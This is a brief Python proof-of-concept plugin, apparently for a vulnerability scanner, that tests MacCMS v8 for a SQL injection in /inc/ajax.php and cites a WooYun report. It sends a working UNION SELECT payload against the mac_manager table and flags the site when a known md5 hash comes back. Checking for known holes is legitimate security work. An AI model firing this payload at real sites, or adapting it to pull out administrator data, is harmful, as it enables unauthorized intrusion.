#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:ko0zhi
"""
POC Name  :	MacCMS v8 /inc_ajax.php SQL注入漏洞
Reference  :  http://wooyun.org/bugs/wooyun-2014-063677
"""


def assign(service,arg):
    if service == "maccms":
        return True,arg
    pass

def audit(arg):
    url = arg
    payload = '/inc/ajax.php?ac=digg&ac2=&id=1&tab=vod+union+select/**/+null,md5(3.1415)+from+mac_manager+--%20'
    verify_url = url +  payload
    code,head,res,errcode, final_url = curl.curl(verify_url)
    if '63e1f04640e83605c1d177544a5a0488' in res:
        security_hole('find sql injection:' +verify_url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('maccms', 'http://www.example.com/')[1])
